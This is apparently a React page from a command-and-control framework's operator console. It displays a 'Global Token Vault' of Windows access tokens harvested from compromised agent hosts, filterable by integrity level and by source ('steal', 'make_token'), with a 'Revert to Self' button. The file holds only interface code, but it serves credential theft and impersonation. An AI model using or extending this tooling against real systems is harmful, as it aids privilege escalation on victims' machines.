"use client";

import { useState, useEffect, useCallback } from "react";
import { API_BASE } from "@/lib/constants";
import { PageHeader, SearchInput, Pagination } from "@/components/UI";

interface Token {
  ID: string;
  AgentID: string;
  Domain?: string;
  domain?: string;
  Username?: string;
  username?: string;
  Integrity?: string;
  integrity?: string;
  Source?: string;
  source?: string;
  PID?: number;
  pid?: number;
  ProcessName?: string;
  process_name?: string;
  Active?: boolean;
  active?: boolean;
  Notes?: string;
  notes?: string;
  CreatedAt?: string;
  created_at?: string;
}

interface Agent {
  ID: string;
  Hostname: string;
}

export default function TokensPage() {
  const [tokens, setTokens] = useState<Token[]>([]);
  const [agents, setAgents] = useState<Agent[]>([]);
  const [loading, setLoading] = useState(true);
  const [integrityFilter, setIntegrityFilter] = useState("");
  const [sourceFilter, setSourceFilter] = useState("");
  const [usernameFilter, setUsernameFilter] = useState("");

  const loadData = useCallback(async () => {
    setLoading(true);
    try {
      const [tokenRes, agentRes] = await Promise.all([
        fetch(`${API_BASE}?p=/tokens&format=json`),
        fetch(`${API_BASE}?p=/agents&page=1&pageSize=200&format=json`),
      ]);
      if (tokenRes.ok) {
        const data = await tokenRes.json();
        setTokens(data.Tokens || data.tokens || []);
      }
      if (agentRes.ok) {
        const data = await agentRes.json();
        setAgents(data.Agents || data || []);
      }
    } catch {
      setTokens([]);
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => { Promise.resolve().then(() => loadData()); }, [loadData]);

  const agentMap: Record<string, string> = {};
  agents.forEach((a) => { agentMap[a.ID] = a.Hostname || a.ID?.substring(0, 8) || ""; });

  const filtered = tokens.filter((t) => {
    const integ = t.Integrity || t.integrity || "Medium";
    const src = t.Source || t.source || "";
    const user = t.Username || t.username || "";
    if (integrityFilter && integ !== integrityFilter) return false;
    if (sourceFilter && src !== sourceFilter) return false;
    if (usernameFilter && !user.toLowerCase().includes(usernameFilter.toLowerCase())) return false;
    return true;
  });

  const handleRevert = async (tokenId: string) => {
    try {
      await fetch(`${API_BASE}?p=/tokens/${tokenId}/revert`, { method: "POST" });
      loadData();
    } catch (e) { console.error("Tokens: revert token failed", e); }
  };

  const getIntegrityBadge = (integrity: string) => {
    const colors: Record<string, string> = {
      System: "bg-red-100 text-red-700 dark:bg-red-900/30 dark:text-red-400",
      High: "bg-orange-100 text-orange-700 dark:bg-orange-900/30 dark:text-orange-400",
      Medium: "bg-yellow-100 text-yellow-700 dark:bg-yellow-900/30 dark:text-yellow-400",
      Low: "bg-slate-100 text-slate-600 dark:bg-slate-700 dark:text-slate-300",
    };
    return <span className={`px-2.5 py-1 text-xs font-semibold rounded-lg ${colors[integrity] || colors.Medium}`}>{integrity}</span>;
  };

  const uniqueUsernames = [...new Set(tokens.map((t) => t.Username || t.username || "").filter(Boolean))];

  return (
    <div className="max-w-7xl mx-auto mb-20 md:mb-0">
      <PageHeader title={<><i className="fa-solid fa-id-badge text-indigo-500 mr-2"></i>Global Token Vault</>} subtitle={"All agents' harvested tokens · " + filtered.length + " tokens"}>
        <button onClick={loadData} className="inline-flex items-center gap-2 px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white text-sm font-medium rounded-2xl transition-colors">
          <i className="fa-solid fa-rotate-right"></i> Refresh
        </button>
      </PageHeader>

      <div className="ui-card p-3 sm:p-4 mb-4 shadow-sm">
        <div className="flex flex-col sm:flex-row gap-3">
          <select value={integrityFilter} onChange={(e) => setIntegrityFilter(e.target.value)} className="bg-slate-50 dark:bg-slate-700 border border-[var(--border)] text-sm rounded-2xl px-3 h-10 cursor-pointer">
            <option value="">All Integrity</option>
            <option value="System">System</option>
            <option value="High">High</option>
            <option value="Medium">Medium</option>
            <option value="Low">Low</option>
          </select>
          <select value={sourceFilter} onChange={(e) => setSourceFilter(e.target.value)} className="bg-slate-50 dark:bg-slate-700 border border-[var(--border)] text-sm rounded-2xl px-3 h-10 cursor-pointer">
            <option value="">All Sources</option>
            <option value="steal">steal</option>
            <option value="make_token">make_token</option>
          </select>
          <div className="flex-1">
            <SearchInput value={usernameFilter} onChange={setUsernameFilter} placeholder="Filter by username..." />
            <datalist id="username-suggestions">
              {uniqueUsernames.map((u) => <option key={u} value={u} />)}
            </datalist>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-4 gap-3 mb-4">
        {["System", "High", "Medium", "Low"].map((level) => {
          const count = tokens.filter((t) => (t.Integrity || t.integrity || "Medium") === level).length;
          const colors: Record<string, string> = {
            System: "border-[var(--border)] bg-[var(--card-bg)]",
            High: "border-[var(--border)] bg-[var(--card-bg)]",
            Medium: "border-[var(--border)] bg-[var(--card-bg)]",
            Low: "border-[var(--border)] bg-[var(--card-bg)]",
          };
          return (
            <div key={level} className={`border rounded-2xl p-3 ${colors[level]} cursor-pointer transition-all ${integrityFilter === level ? "ring-2 ring-indigo-500" : ""}`} onClick={() => setIntegrityFilter(integrityFilter === level ? "" : level)}>
              <div className="text-xs text-slate-500 dark:text-slate-400">{level}</div>
              <div className="text-lg font-bold text-slate-900 dark:text-slate-100">{count}</div>
            </div>
          );
        })}
      </div>

      <div className="ui-card sm:rounded-3xl overflow-hidden shadow-sm">
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead className="bg-slate-50 dark:bg-slate-700/50 border-b border-[var(--border)] sticky top-0 z-10">
              <tr className="text-xs text-slate-500 dark:text-slate-400">
                <th className="text-left px-5 py-3 font-normal">Agent</th>
                <th className="text-left px-4 py-3 font-normal">User</th>
                <th className="text-left px-4 py-3 font-normal">Integrity</th>
                <th className="text-left px-4 py-3 font-normal">Source</th>
                <th className="text-left px-4 py-3 font-normal">Process</th>
                <th className="text-left px-4 py-3 font-normal">Status</th>
                <th className="text-left px-4 py-3 font-normal">Time</th>
                <th className="text-left px-4 py-3 font-normal">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-100 dark:divide-slate-700">
              {!loading && filtered.map((t) => {
                const tid = t.ID || "";
                const domain = t.Domain || t.domain || "";
                const username = t.Username || t.username || "";
                const integrity = t.Integrity || t.integrity || "Medium";
                const source = t.Source || t.source || "steal";
                const pid = t.PID || t.pid;
                const procName = t.ProcessName || t.process_name;
                const active = t.Active !== undefined ? t.Active : t.active;
                const createdAt = t.CreatedAt || t.created_at || "";
                const agentHostname = agentMap[t.AgentID] || t.AgentID?.substring(0, 8) || "-";
                return (
                  <tr key={tid} className="hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
                    <td className="px-5 py-3"><span className="text-xs font-mono text-indigo-600 dark:text-indigo-400 font-medium">{agentHostname}</span></td>
                    <td className="px-4 py-3"><span className="font-semibold text-slate-900 dark:text-slate-100 text-sm">{domain}\{username}</span></td>
                    <td className="px-4 py-3">{getIntegrityBadge(integrity)}</td>
                    <td className="px-4 py-3">
                      <span className={`px-2 py-0.5 rounded text-xs font-medium ${source === "steal" ? "bg-amber-100 text-amber-700 dark:bg-amber-900/30 dark:text-amber-400" : source === "make_token" ? "bg-emerald-100 text-emerald-700 dark:bg-emerald-900/30 dark:text-emerald-400" : "bg-slate-100 text-slate-600 dark:bg-slate-700 dark:text-slate-300"}`}>{source}</span>
                    </td>
                    <td className="px-4 py-3 text-xs font-mono text-slate-500 dark:text-slate-400">{pid ? `[${pid}]` : ""} {procName || ""}</td>
                    <td className="px-4 py-3">
                      {active ? (
                        <span className="inline-flex items-center gap-1.5 text-xs text-amber-700 dark:text-amber-400">
                          <span className="w-2 h-2 bg-amber-500 rounded-full animate-pulse"></span>Active
                        </span>
                      ) : (
                        <span className="text-xs text-slate-400 dark:text-slate-500">Inactive</span>
                      )}
                    </td>
                    <td className="px-4 py-3 text-xs font-mono text-slate-400 dark:text-slate-500">{createdAt ? new Date(createdAt).toLocaleString() : "-"}</td>
                    <td className="px-4 py-3">
                      <div className="flex items-center gap-1">
                        <button onClick={() => handleRevert(tid)} className="p-1.5 text-slate-400 hover:text-indigo-500 rounded-lg hover:bg-indigo-50 dark:hover:bg-indigo-900/20 transition-colors" title="Revert to Self">
                          <i className="fa-solid fa-rotate-left text-xs"></i>
                        </button>
                      </div>
                    </td>
                  </tr>
                );
              })}
              {loading && Array.from({ length: 5 }).map((_, i) => (<tr key={i}><td colSpan={8} className="py-3 px-4"><div className="h-8 bg-slate-100 dark:bg-slate-700 rounded animate-pulse"></div></td></tr>))}
              {!loading && filtered.length === 0 && (<tr><td colSpan={8} className="py-20 text-center text-slate-400"><i className="fa-solid fa-vault text-2xl mb-2"></i><p className="text-sm">No tokens found</p></td></tr>)}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
